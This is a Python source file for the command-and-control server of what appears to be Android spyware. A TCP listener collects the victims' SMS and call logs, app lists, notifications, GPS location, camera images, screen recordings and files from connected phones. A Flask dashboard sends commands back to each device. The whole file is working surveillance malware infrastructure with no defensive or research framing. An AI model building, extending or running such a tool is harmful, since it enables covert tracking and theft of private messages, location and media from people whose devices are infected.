import socket
import json
import threading
import base64
import os
import time
from flask import Flask, request, jsonify, render_template, send_from_directory
from werkzeug.utils import secure_filename

app = Flask(__name__)
server_logs = []
clients = {}
clients_lock = threading.Lock()
file_transfers = {}

for folder in ['captured_images', 'device_downloads', 'screen_recordings', 'gallery_downloads']:
    if not os.path.exists(folder): os.makedirs(folder)

def add_log(message):
    msg = f"[{time.strftime('%H:%M:%S')}] {message}"
    print(msg)
    server_logs.insert(0, msg)
    if len(server_logs) > 150: server_logs.pop()

def create_initial_ui_data():
    return {
        "sms_logs": [], "call_logs": [], "file_manager": {"path": "/", "files": []},
        "gallery": {"page": 0, "files": []}, "notifications": [], "apps": [],
        "device_info": {}, "location_url": None, "camera_image": None,
        "location_status": "idle", "location_image": None, "record_status": None, "last_video": None
    }

def handle_incoming_data(data, client_id):
    with clients_lock:
        if client_id not in clients: return
        try:
            p = json.loads(data).get('data', {})
            t = p.get('type', 'UNKNOWN')
            d = clients[client_id]['ui_data']
            if t == 'SMS_LOG': d['sms_logs'].extend(p.get('logs'))
            elif t == 'CALL_LOG': d['call_logs'].extend(p.get('logs'))
            elif t == 'DEVICE_INFO': d['device_info'].update(p.get('info'))
            elif t == 'APP_LIST': d['apps'].extend(p.get('apps'))
            elif t == 'FILE_MANAGER_RESULT': d['file_manager'].update(p.get("listing"))
            elif t == 'NOTIFICATION_DATA': d['notifications'].insert(0, p.get("notification"))
            elif t == 'LOCATION_PENDING': d.update({"location_status": "pending"})
            elif t == 'LOCATION_SUCCESS': d.update({"location_status": "success", "location_url": p.get("data",{}).get("url"), "location_image": p.get("data",{}).get("image_url")})
            elif t == 'RECORD_STATUS': d.update({"record_status": p.get("status")})
            elif 'CHUNK' in t or 'END' in t: handle_file_transfer(p, t, client_id)
            add_log(f"[{client_id}] Received {t}")
        except Exception as e: add_log(f"Error parsing: {e}")

def handle_file_transfer(p, t, cid):
    global file_transfers
    if 'CHUNK' in t:
        fn = p.get('chunk_data', {}).get('filename')
        if fn: file_transfers.setdefault(fn, []).append(p.get('chunk_data', {}).get('chunk'))
    elif 'END' in t:
        fn = p.get('file')
        if fn and fn in file_transfers:
            folder = 'captured_images' if (fn.endswith('.mp4') or 'CAMERA' in t) else 'device_downloads'
            path = os.path.join(folder, secure_filename(fn))
            try:
                with open(path, 'wb') as f: f.write(base64.b64decode("".join(file_transfers.pop(fn))))
                with clients_lock:
                    if fn.endswith('.mp4'): clients[cid]['ui_data'].update({"last_video": fn, "record_status": "done"})
                    else: clients[cid]['ui_data']['camera_image'] = fn
                add_log(f"Saved {fn}")
            except Exception as e: add_log(f"Save error: {e}")

def handle_client(conn, cid):
    add_log(f"[+] Connected: {cid}")
    buf = ""
    try:
        while True:
            data = conn.recv(16384).decode('utf-8', errors='ignore')
            if not data: break
            buf += data
            while '\n' in buf:
                line, buf = buf.split('\n', 1)
                if line.strip(): handle_incoming_data(line.strip(), cid)
    except: pass
    finally:
        with clients_lock:
            if cid in clients: del clients[cid]
        add_log(f"[-] Disconnected: {cid}"); conn.close()

def tcp_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', 8888))
    s.listen(10)
    while True:
        try:
            c, a = s.accept()
            cid = f"{a[0]}:{a[1]}"
            with clients_lock: clients[cid] = {'socket': c, 'ui_data': create_initial_ui_data()}
            threading.Thread(target=handle_client, args=(c, cid), daemon=True).start()
        except: pass

@app.route('/')
def index(): return render_template('index.html')

@app.route('/api/status')
def get_status():
    with clients_lock:
        cl = []
        for cid, cd in clients.items():
            info = cd['ui_data'].get('device_info', {})
            cl.append({'id': cid, 'model': info.get('Model', 'Unknown'), 'battery': info.get('Battery', 'N/A')})
    return jsonify({"logs": server_logs, "devices": cl})

@app.route('/api/client_data/<cid>')
def get_cd(cid):
    with clients_lock: return jsonify(clients[cid]['ui_data']) if cid in clients else (jsonify({"error": 1}), 404)

@app.route('/api/command', methods=['POST'])
def send_cmd():
    r = request.json
    cid, cmd = r.get('client_id'), r.get('cmd')
    with clients_lock:
        if cid not in clients: return jsonify({"error": 1}), 404
        d = clients[cid]['ui_data']
        if cmd == 'get_location': d.update({"location_status": "requesting", "location_url": None})
        if 'record_' in cmd: d.update({"record_status": "Recording...", "last_video": None})
        try:
            clients[cid]['socket'].sendall(f"{cmd}\n".encode())
            add_log(f"[SEND] {cid}: {cmd}")
            return jsonify({"status": "success"})
        except: return jsonify({"error": 1}), 500

@app.route('/api/delete_file', methods=['POST'])
def del_f():
    fn = request.json.get('filename')
    p = os.path.join('captured_images', secure_filename(fn))
    if os.path.exists(p): os.remove(p); return jsonify({"status": "success"})
    return jsonify({"error": 1}), 404

@app.route('/captured_images/<path:fn>')
def serve_img(fn): return send_from_directory('captured_images', fn)

if __name__ == '__main__':
    threading.Thread(target=tcp_server, daemon=True).start()
    app.run(host='0.0.0.0', port=8080, debug=False)
